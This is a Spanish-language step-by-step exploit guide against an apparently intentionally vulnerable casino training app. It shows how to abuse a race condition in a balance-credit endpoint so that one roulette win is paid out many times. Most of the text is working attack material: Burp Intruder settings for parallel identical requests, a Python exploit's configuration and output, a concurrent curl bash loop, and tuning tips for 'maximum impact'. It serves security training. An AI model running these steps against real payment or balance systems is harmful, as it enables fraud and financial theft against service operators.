# 🎯 Cómo Explotar A04: Race Condition

## Guía Rápida de Explotación

### Requisitos Previos

✅ Backend corriendo en http://localhost:8080
✅ Frontend corriendo en http://localhost:5173
✅ Usuario registrado e iniciado sesión
✅ Burp Suite instalado (o Python 3)

---

## Método 1: Burp Suite (Recomendado)

### Paso 1: Configurar Burp Suite

1. Abre Burp Suite
2. Ve a **Proxy → Options**
3. Verifica que el proxy esté en `127.0.0.1:8080`
4. Configura tu navegador para usar el proxy de Burp

### Paso 2: Interceptar la Request

1. En Burp, ve a **Proxy → Intercept** y activa "Intercept is on"
2. En el navegador, ve a http://localhost:5173/roulette
3. Juega a la ruleta y **apuesta a un color** (más fácil de ganar)
4. Cuando ganes, Burp interceptará la request `POST /api/balance/add`

La request se verá así:

```http
POST /api/balance/add HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json
Content-Length: 123

{
  "bet_id": 1,
  "game_token": "a1b2c3d4e5f6...",
  "amount": 20
}
```

### Paso 3: Enviar a Intruder

1. Click derecho en la request → **Send to Intruder**
2. Ve a la pestaña **Intruder**

### Paso 4: Configurar el Ataque

**En la pestaña "Positions":**
- Haz click en **Clear §** para limpiar todas las posiciones
- NO marques ningún campo (queremos enviar la misma request múltiples veces)

**En la pestaña "Payloads":**
- Payload type: **Null payloads**
- Payload count: **20** (genera 20 requests idénticas)

**En la pestaña "Options":**
- **Request Engine:**
  - Number of threads: **20** (máximo paralelismo)
  - Connection timeout: 10 seconds
- **Grep - Match:** (opcional) agrega "Balance updated successfully"

### Paso 5: Ejecutar el Ataque

1. Click en **Start Attack**
2. Observa la ventana de resultados
3. **Resultado esperado**: Múltiples responses con status **200 OK**

### Paso 6: Verificar el Exploit

1. Refresca la página de la ruleta
2. Tu balance debería haberse multiplicado por ~20 veces
3. **Ejemplo**: Si ganaste $20, ahora tendrías $400 extra (o más)

---

## Método 2: Script Python

### Paso 1: Obtener los Datos Necesarios

1. Juega y gana una apuesta
2. Abre las **Developer Tools** (F12)
3. Ve a **Application → Local Storage → http://localhost:5173**
4. Copia el valor de `authToken` (este es tu JWT)
5. Ve a **Network**
6. Busca la request `POST /api/balance/add`
7. En el payload, copia:
   - `bet_id`
   - `game_token`
   - `amount`

### Paso 2: Configurar el Script

```bash
cd /home/toto/teamberos-vulnerable-app/casino-back/docs
nano exploit-race-condition.py
```

Edita las líneas:

```python
JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."  # Tu token
GAME_TOKEN = "a1b2c3d4e5f6..."  # Del request interceptado
BET_ID = 1  # Del request interceptado
AMOUNT = 20.0  # Monto que ganaste
NUM_REQUESTS = 20  # Cuántas veces duplicar
```

### Paso 3: Ejecutar el Script

```bash
python3 exploit-race-condition.py
```

**Output esperado:**

```
╔═══════════════════════════════════════════════════════════╗
║       A04: Race Condition Exploit - Casino Backend       ║
║              POST /api/balance/add Vulnerability          ║
╚═══════════════════════════════════════════════════════════╝

Configuración:
  • Bet ID:      1
  • Game Token:  a1b2c3d4e5f6...
  • Amount:      $20.0
  • Requests:    20

[1/4] Obteniendo balance inicial...
      Balance inicial: $1000

[2/4] ¿Continuar con el exploit?
      Se enviarán 20 requests concurrentes
      Balance esperado: $1400
      Presiona ENTER para continuar o Ctrl+C para cancelar: 

[3/4] Enviando 20 requests concurrentes...
      Explotando race condition...

Resultados:
  • Exitosas:    18
  • Fallidas:    2

[4/4] Verificando balance final...

Balance Final:
  • Inicial:     $1000
  • Final:       $1360
  • Ganancia:    $360
  • Esperado:    $360

✅ EXPLOIT EXITOSO!
   La race condition permitió acreditar el mismo premio 18 veces
```

---

## Método 3: Curl (Manual)

Si no tienes Burp ni Python, puedes hacerlo manualmente con curl:

### Paso 1: Obtener los Datos

Mismos pasos que el Método 2 para obtener JWT, game_token, bet_id, amount.

### Paso 2: Crear Script Bash

```bash
#!/bin/bash
JWT="tu_jwt_aqui"
GAME_TOKEN="tu_game_token_aqui"
BET_ID=1
AMOUNT=20

# Enviar 20 requests concurrentes
for i in {1..20}; do
  curl -X POST http://localhost:8080/api/balance/add \
    -H "Authorization: Bearer $JWT" \
    -H "Content-Type: application/json" \
    -d "{\"bet_id\":$BET_ID,\"game_token\":\"$GAME_TOKEN\",\"amount\":$AMOUNT}" \
    &
done

wait
echo "Exploit completo"
```

### Paso 3: Ejecutar

```bash
chmod +x exploit.sh
./exploit.sh
```

---

## 🎯 Tips para Máximo Éxito

### 1. Usa Apuestas de Color (No Números)

- **Color**: 50% de probabilidad de ganar, premio 2x
- **Número**: 2.6% de probabilidad, pero premio 36x
- Para el exploit, es más fácil ganar con colores

### 2. Apuesta Montos Pequeños

- Apuesta $10-$20 en un color
- Multiplica por 20 con el exploit
- Resultado: $200-$400 extra por juego

### 3. Timing del Exploit

- Ejecuta el exploit **inmediatamente** después de ganar
- El `game_token` es único por juego
- Si esperas mucho, podrías perder el token

### 4. Número de Threads/Requests

- **10-20 threads**: Bueno para empezar
- **50+ threads**: Máximo impacto, pero más obvio
- La race condition es más efectiva con más threads

### 5. Si el Exploit Falla

Posibles razones:

❌ **JWT expirado**: Inicia sesión de nuevo
❌ **Game token ya usado**: Juega otra partida
❌ **Pocos threads**: Aumenta a 30-50
❌ **Requests muy lentas**: Verifica conexión

---

## 📊 Resultados Esperados

### Escenario Típico

- Apuestas: $10 a rojo
- Ganas: $20
- Exploit con 20 threads
- Éxito: 15-18 requests exitosas
- **Ganancia total: $300-$360** (en lugar de $20)

### Escenario Agresivo

- Apuestas: $50 a negro
- Ganas: $100
- Exploit con 50 threads
- Éxito: 40-45 requests exitosas
- **Ganancia total: $4000-$4500** (en lugar de $100)

---

## 🔍 Cómo Verificar si Funcionó

### Opción 1: Frontend

1. Refresca la página de la ruleta
2. Mira tu balance en la esquina superior derecha
3. Debería ser mucho mayor que antes

### Opción 2: API

```bash
curl -X GET http://localhost:8080/api/balance \
  -H "Authorization: Bearer TU_JWT_AQUI"
```

### Opción 3: Base de Datos

```bash
cd casino-back
sqlite3 database/casino.db "SELECT * FROM balances WHERE user_id=1;"
sqlite3 database/casino.db "SELECT COUNT(*) FROM game_token_credits WHERE game_token='TU_GAME_TOKEN';"
# Si el número es > 1, el exploit funcionó
```

---

## ⚠️ Solución de Problemas

### Error: "This game token has already been credited"

- El token ya fue usado
- **Solución**: Juega otra partida y obtén un nuevo token

### Error: "Unauthorized"

- JWT inválido o expirado
- **Solución**: Inicia sesión nuevamente y obtén un nuevo token

### Pocas Requests Exitosas (solo 1-2)

- No hubo race condition, las requests llegaron secuencialmente
- **Solución**: Aumenta el número de threads/requests a 50+

### "Connection refused"

- El backend no está corriendo
- **Solución**: `cd casino-back && ./main`

---

## 📚 Más Información

- **Documentación técnica**: `casino-back/docs/A04-RACE-CONDITION.md`
- **Código vulnerable**: `casino-back/internal/handlers/balance.go`
- **Script Python**: `casino-back/docs/exploit-race-condition.py`

---

## ⚠️ Recordatorio

Este es un **proyecto educativo** con vulnerabilidades intencionales.

**NO uses estas técnicas en sistemas reales sin autorización.**

---

**¡Buena suerte con el exploit! 🎰**

